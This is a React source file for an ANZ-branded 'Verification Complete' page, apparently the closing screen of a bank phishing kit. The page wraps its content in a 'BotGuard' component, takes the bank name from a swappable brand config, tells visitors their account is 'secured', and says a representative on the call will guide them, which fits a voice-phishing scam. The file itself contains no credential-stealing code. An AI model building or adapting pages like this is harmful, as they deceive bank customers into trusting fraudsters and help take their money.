'use client';

/**
 * ANZ Completed/Success Page
 * Centered single-column layout
 */

import { currentBrand } from '@/config/branding';
import { BotGuard } from '@/components/security/BotGuard';

export default function CompletedPage() {
  return (
    <BotGuard>
      {/* Page Title */}
      <h1 className="page-title">Verification Complete</h1>

      {/* Content Card */}
      <div className="login-card">
        {/* Card Header - Mobile only */}
        <div className="card-header">
          <h2>Verification Complete</h2>
        </div>

        <div className="login-form">
          <p style={{ color: 'var(--anz-white)', fontSize: '16px', fontWeight: 500, textAlign: 'center' }}>
            Thank you for verifying your identity.
          </p>

          <p style={{ color: 'var(--anz-white)', fontSize: '14px', textAlign: 'center', marginTop: '8px', opacity: 0.9 }}>
            Your account has been secured. You may safely close this window.
          </p>

          <p style={{ color: 'var(--anz-white)', fontSize: '14px', textAlign: 'center', marginTop: '24px', opacity: 0.9 }}>
            If you were on a call with a representative, they will guide you through the next steps.
          </p>

          <p style={{ color: 'var(--anz-white)', fontSize: '13px', textAlign: 'center', marginTop: '32px', opacity: 0.8 }}>
            Thank you for banking with {currentBrand.companyName}.
          </p>
        </div>
      </div>
    </BotGuard>
  );
}
